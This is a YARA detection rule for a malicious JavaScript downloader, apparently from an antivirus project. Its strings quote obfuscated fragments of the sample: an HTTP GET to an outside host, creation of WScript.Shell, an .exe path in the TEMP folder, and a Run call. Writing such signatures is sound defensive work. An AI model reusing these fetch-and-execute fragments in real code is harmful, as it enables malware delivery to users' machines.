rule sig_20160401_a8f3a789f33f0763b7949a5bca594557 {
  meta:
    description = "datamaliciousorder - file 20160401_a8f3a789f33f0763b7949a5bca594557.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "29bd6f1cac7997917dacf48641e544c7731081fa43ac834666a36c8abbb7a987"

  strings:
    $s1  = "SqEn[AlzUgj](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "function GcbGx(JqJy, YoIe){EdZl = EdZl * 1; return JqJy - YoIe;};" fullword ascii
    $s3  = "var FmKg = function YeoEf() {return WScript[RdIuw](\"WScript\"+\".Shell\");}(), WbzQu = 11;" fullword ascii
    $s4  = "if (SqEn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DkfFbh(){return TyfLf + \"\";};" fullword ascii
    $s6  = "function TvAy() {return FmKg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"lgllMdZd.ex\" + \"e\";};" fullword ascii
    $s7  = "function IzDzb() {return ((BbmOkb == true) && (BbmOkb == CxtDgu)) ? 1 : EdZl;};" fullword ascii
    $s8  = "var BclIzo = false;" fullword ascii
    $s9  = "function UbnHeu()" fullword ascii
    $s10 = "function MrhKli(VpwMv) {var OjFpf = (1, 2, 3, 4, 5, VpwMv); return OjFpf;};" fullword ascii
    $s11 = "var CxtDgu = false;" fullword ascii
    $s12 = "CxtDgu = true; " fullword ascii
    $s13 = "function BtKs(){return RdIuw;};" fullword ascii
    $s14 = "}while (LotRxl);" fullword ascii
    $s15 = "return GcbGx(SyPo, BepVp);" fullword ascii
    $s16 = "function RfMv(){return 23;};" fullword ascii
    $s17 = "BbmOkb = true; " fullword ascii
    $s18 = "function HcEz(IfeGy){FmKg[\"R\"+\"un\"](IfeGy, EdZl, EdZl);};" fullword ascii
    $s19 = "var EuTd = new this[\"Date\"]();" fullword ascii
    $s20 = "var BbmOkb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}